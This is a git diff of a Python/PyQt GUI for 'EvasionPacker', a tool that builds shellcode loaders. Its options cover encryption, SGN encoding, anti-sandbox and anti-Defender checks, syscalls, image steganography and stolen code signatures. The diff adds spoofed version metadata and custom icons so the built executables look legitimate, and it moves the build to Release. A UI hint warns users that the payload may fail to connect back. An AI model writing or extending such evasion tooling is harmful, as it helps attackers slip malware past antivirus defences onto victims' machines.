@@ -3,7 +3,6 @@ import sys
 import struct
 import secrets
 
-# TODO 记得将Debug改为Release
 
 from configManager import ConfigManager
 from Crypto.Cipher import AES
@@ -58,14 +57,14 @@ class MainWindow(QMainWindow):
         self.config_manager = ConfigManager()
         self.compile_thread = None
         self.processing_label = None
-        self.generate_btn = None  # 添加生成按钮的引用
+        self.generate_btn = None  
         self.init_ui()
-        self.setMinimumWidth(600)  # 增加最小宽度
-        self.setMinimumHeight(500)  # 设置最小高度
+        self.setMinimumWidth(900)  
+        self.setMinimumHeight(1000)  
 
     def show_processing_label(self, message):
         if not self.processing_label:
-            # 创建半透明背景
+            
             self.overlay = QWidget(self)
             self.overlay.setStyleSheet("background-color: rgba(0, 0, 0, 0.5);")
             self.overlay.hide()
@@ -93,14 +92,14 @@ class MainWindow(QMainWindow):
         y = (self.overlay.height() - self.processing_label.height()) // 2
         self.processing_label.move(x, y)
         
-        # 禁用所有控件
+
         self.setEnabled(False)
         self.overlay.setEnabled(True)
         self.processing_label.setEnabled(True)
     def hide_processing_label(self):
         if hasattr(self, 'overlay'):
             self.overlay.hide()
-        # 恢复所有控件
+
         self.setEnabled(True)
     def browse_file(self):
         file_name, _ = QFileDialog.getOpenFileName(
@@ -119,35 +118,89 @@ class MainWindow(QMainWindow):
             self.output_path.setText(file_name)
     def resizeEvent(self, event):
         super().resizeEvent(event)
-        # 窗口大小改变时，调整遮罩层和标签位置
         if hasattr(self, 'overlay') and self.overlay.isVisible():
             self.overlay.resize(self.size())
             x = (self.overlay.width() - self.processing_label.width()) // 2
             y = (self.overlay.height() - self.processing_label.height()) // 2
             self.processing_label.move(x, y)
+    
+    def update_version_info(self):
+        import re
+        current_dir = os.path.dirname(os.path.abspath(__file__))
+        rc_path = os.path.join(current_dir, "..", "Loader", "EvasionPacker.rc")
+        
+        try:
+            if not os.path.exists(rc_path):
+                QMessageBox.warning(self, "警告", f"找不到RC文件：{rc_path}")
+                return False
+
+            encodings = ['utf-8', 'gbk', 'utf-16', 'utf-16le']
+            content = None
+            
+            for encoding in encodings:
+                try:
+                    with open(rc_path, 'r', encoding=encoding) as f:
+                        content = f.read()
+                    break
+                except UnicodeDecodeError:
+                    continue
+            
+            if content is None:
+                raise ValueError("无法读取RC文件，不支持的编码格式")
+            
+            version = self.version_edit.text().strip()
+            if not re.match(r'^\d+\.\d+\.\d+\.\d+$', version):
+                QMessageBox.warning(self, "警告", "版本号格式不正确，应为x.x.x.x格式")
+                return
+                
+            version_nums = version.replace('.', ',')
+            
+            content = re.sub(r'FILEVERSION \d+,\d+,\d+,\d+', f'FILEVERSION {version_nums}', content)
+            content = re.sub(r'PRODUCTVERSION \d+,\d+,\d+,\d+', f'PRODUCTVERSION {version_nums}', content)
+            content = re.sub(r'VALUE "FileVersion", *"[^"]*"', f'VALUE "FileVersion", "{version}"', content)
+            content = re.sub(r'VALUE "ProductVersion", *"[^"]*"', f'VALUE "ProductVersion", "{version}"', content)
+            content = re.sub(r'VALUE "CompanyName", *"[^"]*"', f'VALUE "CompanyName", "{self.company_edit.text()}"', content)
+            content = re.sub(r'VALUE "FileDescription", *"[^"]*"', f'VALUE "FileDescription", "{self.desc_edit.text()}"', content)
+            content = re.sub(r'VALUE "LegalCopyright", *"[^"]*"', f'VALUE "LegalCopyright", "{self.copyright_edit.text()}"', content)
+            content = re.sub(r'VALUE "ProductName", *"[^"]*"', f'VALUE "ProductName", "{self.desc_edit.text()}"', content)
+            content = re.sub(r'VALUE "OriginalFilename", *"[^"]*"', f'VALUE "OriginalFilename", "{self.desc_edit.text()}"', content)
+            content = re.sub(r'VALUE "InternalName", *"[^"]*"', f'VALUE "InternalName", "{self.desc_edit.text()}"', content)
+            
+            
+            if not any(pattern in content for pattern in ['FILEVERSION', 'PRODUCTVERSION', 'VALUE']):
+                raise ValueError("RC文件格式不正确")
+                
+            with open(rc_path, 'w', encoding=encoding) as f:
+                f.write(content)
+                return True
+                
+        except Exception as e:
+            QMessageBox.warning(self, "警告", f"更新版本信息失败：{str(e)}")
+            return False
     def init_ui(self):
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         layout = QVBoxLayout(central_widget)
-        # 加密设置组
+        layout.setSpacing(20)  
+        layout.setContentsMargins(20, 20, 20, 20)  
         encryption_group = QGroupBox("Shellcode加密设置")
+        encryption_group.setFixedHeight(150)  
         encryption_layout = QVBoxLayout()
-        
-        # 添加SGN选项
+        encryption_layout.setSpacing(5)
+        encryption_layout.setContentsMargins(10, 10, 10, 10)
         self.sgn_check = QCheckBox("启用SGN预处理shellcode")
         encryption_layout.addWidget(self.sgn_check)
-        # 加密方式选择
         enc_method_layout = QHBoxLayout()
+        enc_method_layout.setSpacing(5)  
         enc_method_label = QLabel("加密方式:")
         self.encryption_combo = QComboBox()
-        self.encryption_combo.addItems(self.config_manager.encryption_methods)  # 使用新的加密方法列表
+        self.encryption_combo.addItems(self.config_manager.encryption_methods)
         enc_method_layout.addWidget(enc_method_label)
         enc_method_layout.addWidget(self.encryption_combo)
         encryption_layout.addLayout(enc_method_layout)
-    
-    
-        # 文件选择
+        
         file_layout = QHBoxLayout()
+        file_layout.setSpacing(5)  
         self.file_path = QLineEdit()
         self.file_path.setReadOnly(True)
         browse_btn = QPushButton("选择Shellcode")
@@ -157,15 +210,18 @@ class MainWindow(QMainWindow):
         encryption_layout.addLayout(file_layout)
         encryption_group.setLayout(encryption_layout)
         layout.addWidget(encryption_group)
-        # Loader配置组
+
         loader_group = QGroupBox("Loader配置")
+        loader_group.setFixedHeight(300)  
         loader_layout = QVBoxLayout()
-    
+        loader_layout.setSpacing(3)
+        loader_layout.setContentsMargins(10, 10, 10, 10)
         layout.addWidget(loader_group)
-        # 添加签名设置组
+
         sign_group = QGroupBox("输出设置")
-        sign_layout = QVBoxLayout()  # 改为垂直布局
-        # 签名文件选择
+        sign_layout = QVBoxLayout()
+        sign_layout.setSpacing(5)
+        sign_layout.setContentsMargins(10, 10, 10, 10)
         sign_file_layout = QHBoxLayout()
         self.sign_path = QLineEdit()
         self.sign_path.setReadOnly(True)
@@ -174,17 +230,26 @@ class MainWindow(QMainWindow):
         browse_sign_btn.clicked.connect(self.browse_sign_file)
         sign_file_layout.addWidget(self.sign_path)
         sign_file_layout.addWidget(browse_sign_btn)
-    # 隐写设置
+        
+        icon_file_layout = QHBoxLayout()
+        self.icon_path = QLineEdit()
+        self.icon_path.setReadOnly(True)
+        self.icon_path.setPlaceholderText("选择自定义图标文件(可选)")
+        browse_icon_btn = QPushButton("选择图标")
+        browse_icon_btn.clicked.connect(self.browse_icon_file)
+        icon_file_layout.addWidget(self.icon_path)
+        icon_file_layout.addWidget(browse_icon_btn)
+        sign_layout.addLayout(icon_file_layout)
+        
         steg_layout = QHBoxLayout()
         self.steg_check = QCheckBox("启用图片隐写")
-        self.steg_name = QLineEdit()  # 新增
-        self.steg_name.setFixedWidth(60)  # 设置固定宽度
-        self.steg_name.setText("1.png")   # 设置默认文件名
+        self.steg_name = QLineEdit()  
+        self.steg_name.setFixedWidth(60)  
+        self.steg_name.setText("1.png")  
         steg_layout.addWidget(self.steg_check)
-        steg_layout.addWidget(self.steg_name)  # 新增
+        steg_layout.addWidget(self.steg_name) 
         sign_layout.addLayout(steg_layout)
     
-        # 输出文件选择
         output_file_layout = QHBoxLayout()
         self.output_path = QLineEdit()
         self.output_path.setReadOnly(True)
@@ -197,8 +262,56 @@ class MainWindow(QMainWindow):
         sign_layout.addLayout(sign_file_layout)
         sign_layout.addLayout(output_file_layout)
         sign_group.setLayout(sign_layout)
+
+
+
+        version_group = QGroupBox("版本信息设置")
+        version_layout = QVBoxLayout()
+        version_layout.setSpacing(10)   
+        version_layout.setContentsMargins(15, 15, 15, 15) 
+
+        company_layout = QHBoxLayout()
+        company_label = QLabel("公司名称:")
+        self.company_edit = QLineEdit()
+        self.company_edit.setText("Evasion")
+        company_layout.addWidget(company_label)
+        company_layout.addWidget(self.company_edit)
+        version_layout.addLayout(company_layout)
+        
+
+        desc_layout = QHBoxLayout()
+        desc_label = QLabel("文件描述:")
+        self.desc_edit = QLineEdit()
+        self.desc_edit.setText("Evasion.exe")
+        desc_layout.addWidget(desc_label)
+        desc_layout.addWidget(self.desc_edit)
+        version_layout.addLayout(desc_layout)
+        
+
+        version_layout_h = QHBoxLayout()
+        version_label = QLabel("版本号:")
+        self.version_edit = QLineEdit()
+        self.version_edit.setText("0.0.0.6")
+        version_layout_h.addWidget(version_label)
+        version_layout_h.addWidget(self.version_edit)
+        version_layout.addLayout(version_layout_h)
+
+
+        copyright_layout = QHBoxLayout()
+        copyright_label = QLabel("版权信息:")
+        self.copyright_edit = QLineEdit()
+        self.copyright_edit.setText("Copyright (C) 2025")
+        copyright_layout.addWidget(copyright_label)
+        copyright_layout.addWidget(self.copyright_edit)
+        version_layout.addLayout(copyright_layout)
+        
+        version_group.setLayout(version_layout)
+        sign_layout.addWidget(version_group)
+
+
+
+
         layout.addWidget(sign_group)
-        # 添加提示标签
         tip_label = QLabel("反沙箱请基于目标环境按需勾选，以免上不了线")
         tip_label.setStyleSheet("""
             QLabel {
@@ -212,13 +325,12 @@ class MainWindow(QMainWindow):
         """)
         loader_layout.addWidget(tip_label)
         
-        # 基本选项
         self.syscall_check = QCheckBox("启用 Syscall")
         self.anti_vm_check = QCheckBox("启用 基本沙箱检测")
         self.anti_defender_check = QCheckBox("反沙箱-WindowsDefender专用")
         self.dll_trick_check = QCheckBox("反沙箱-DllGetClassObject")
         self.sx_trick_check = QCheckBox("反沙箱-SxInDll")
-        self.vxqq_check = QCheckBox("反沙箱-基于微信QQ")  # 添加新选项
+        self.vxqq_check = QCheckBox("反沙箱-基于微信QQ")  
         loader_layout.addWidget(self.syscall_check)
         loader_layout.addWidget(self.anti_vm_check)
         loader_layout.addWidget(self.anti_defender_check)
@@ -229,7 +341,6 @@ class MainWindow(QMainWindow):
         self.dll_trick_check.setChecked(True)
         self.syscall_check.setChecked(True)
         self.sx_trick_check.setChecked(True)
-        # 执行方法
         exec_layout = QHBoxLayout()
         exec_label = QLabel("执行方法:")
         self.exec_combo = QComboBox()
@@ -238,16 +349,14 @@ class MainWindow(QMainWindow):
         exec_layout.addWidget(exec_label)
         exec_layout.addWidget(self.exec_combo)
         loader_layout.addLayout(exec_layout)
-        # 回调触发方法
         enum_layout = QHBoxLayout()
         enum_label = QLabel("回调触发方法:")
         self.enum_combo = QComboBox()
         self.enum_combo.addItems(self.config_manager.enum_methods)
-        self.enum_combo.setEnabled(False)  # 默认禁用
+        self.enum_combo.setEnabled(False)  
         enum_layout.addWidget(enum_label)
         enum_layout.addWidget(self.enum_combo)
         loader_layout.addLayout(enum_layout)
-        # 内存分配方法
         alloc_layout = QHBoxLayout()
         alloc_label = QLabel("内存分配方法:")
         self.alloc_combo = QComboBox()
@@ -257,9 +366,8 @@ class MainWindow(QMainWindow):
         loader_layout.addLayout(alloc_layout)
         loader_group.setLayout(loader_layout)
         layout.addWidget(loader_group)
-        # 生成按钮
-        self.generate_btn = QPushButton("生成")  # 使用类成员变量
-        self.generate_btn.setFixedHeight(35)  # 设置按钮高度
+        self.generate_btn = QPushButton("生成")  
+        self.generate_btn.setFixedHeight(35) 
         self.generate_btn.setStyleSheet("""
             QPushButton {
                 background-color: #007bff;
@@ -278,7 +386,6 @@ class MainWindow(QMainWindow):
         """)
         self.generate_btn.clicked.connect(self.generate)
         layout.addWidget(self.generate_btn)
-        # 为所有的QComboBox设置统一的样式
         combo_style = """
             QComboBox {
                 padding: 5px;
@@ -287,10 +394,9 @@ class MainWindow(QMainWindow):
         """
         for combo in [self.encryption_combo, self.exec_combo, self.enum_combo, self.alloc_combo]:
             combo.setStyleSheet(combo_style)
-        # 为所有的QCheckBox设置统一的样式和间距
         for check in [self.syscall_check, self.anti_vm_check, self.anti_defender_check, 
                      self.dll_trick_check, self.sx_trick_check, self.vxqq_check, self.sgn_check]:
-            check.setStyleSheet("QCheckBox { padding: 5px; }")
+            check.setStyleSheet("QCheckBox { padding: 2px; }")
     def browse_steg_file(self):
         file_name, _ = QFileDialog.getOpenFileName(
             self, "选择PNG图片", "", "PNG图片 (*.png);;所有文件 (*.*)")
@@ -300,14 +406,13 @@ class MainWindow(QMainWindow):
         if success:
             try:
                 current_dir = os.path.dirname(os.path.abspath(__file__))
-                input_path = os.path.join(current_dir, "..", "Loader", "x64", "Debug", "EvasionPacker.exe")
+                input_path = os.path.join(current_dir, "..", "Loader", "x64", "Release", "EvasionPacker.exe")
                 
-                # 处理签名和输出
                 if self.sign_path.text():
                     sys.path.append(os.path.join(current_dir, "tools"))
                     from sigthief import copyCert, writeCert
                     
-                    temp_signed = os.path.join(current_dir, "..", "Loader", "x64", "Debug", "EvasionPacker_signed.exe")
+                    temp_signed = os.path.join(current_dir, "..", "Loader", "x64", "Release", "EvasionPacker_signed.exe")
                     cert = copyCert(self.sign_path.text())
                     writeCert(cert, input_path, temp_signed)
                     
@@ -322,7 +427,6 @@ class MainWindow(QMainWindow):
                     QMessageBox.information(self, "成功", "文件生成完成" + 
                         ("，并已完成签名窃取" if self.sign_path.text() else ""))
                 else:
-                    # 如果没有指定输出路径，显示默认生成位置
                     QMessageBox.information(self, "成功", f"文件已生成到：{input_path}" + 
                         ("，并已完成签名窃取" if self.sign_path.text() else ""))
                         
@@ -333,6 +437,12 @@ class MainWindow(QMainWindow):
         
         self.hide_processing_label()
 
+    def browse_icon_file(self):
+        file_name, _ = QFileDialog.getOpenFileName(
+            self, "选择图标文件", "", "图标文件 (*.ico);;所有文件 (*.*)")
+        if file_name:
+            self.icon_path.setText(file_name)
+    
     def on_shellcode_finished(self, success, error_msg, encrypted_data):
         if not success:
             self.hide_processing_label()
@@ -342,29 +452,32 @@ class MainWindow(QMainWindow):
         try:
             current_dir = os.path.dirname(os.path.abspath(__file__))
             
+            if not self.update_version_info():
+                self.hide_processing_label()
+                return
+
+            if self.icon_path.text():
+                import shutil
+                icon_dest = os.path.join(current_dir, "..", "Loader", "icon.ico")
+                shutil.copy2(self.icon_path.text(), icon_dest)
+            
             if self.steg_check.isChecked():
-                # 使用用户指定的文件名
                 steg_filename = self.steg_name.text() if self.steg_name.text() else "shellcode_steg.png"
                 steg_output = os.path.join(current_dir, "..", "Loader", steg_filename)
                 
-                # 写入key和shellcode大小到header
                 self.config_manager.save_to_header_placeholder(len(encrypted_data))
                 
-                # 隐写加密后的shellcode
                 self.config_manager.steg_shellcode_to_image(
                     encrypted_data,
                     steg_output
                 )
                 QMessageBox.information(self, "提示", f"隐写图片已生成到：{steg_output}")
             else:
-                # 不使用隐写，正常写入key和shellcode
                 self.config_manager.save_to_header(encrypted_data)
             
-            # 更新配置文件
             settings = self.config_manager.get_settings_from_ui(self)
             self.config_manager.update_config(settings)
 
-            # 开始编译
             sln_path = os.path.normpath(os.path.join(current_dir, "..", "Loader", "EvasionPacker.sln"))
             self.compile_thread = CompileThread(sln_path)
             self.compile_thread.finished.connect(self.on_compile_finished)
@@ -382,16 +495,14 @@ class MainWindow(QMainWindow):
         settings = self.config_manager.get_settings_from_ui(self)
         
         try:
-            # 处理shellcode
+            
             self.config_manager.shellcode_path = self.file_path.text()
             self.config_manager.sgn_enabled = self.sgn_check.isChecked()
             
-            # 启动shellcode处理线程
             self.shellcode_thread = ShellcodeThread(self.config_manager, settings)
             self.shellcode_thread.finished.connect(self.on_shellcode_finished)
             self.shellcode_thread.start()
             
-            # 显示处理提示
             message = "正在处理Shellcode"
             if self.sgn_check.isChecked():
                 message += "（使用SGN预处理，预计需要30秒）"
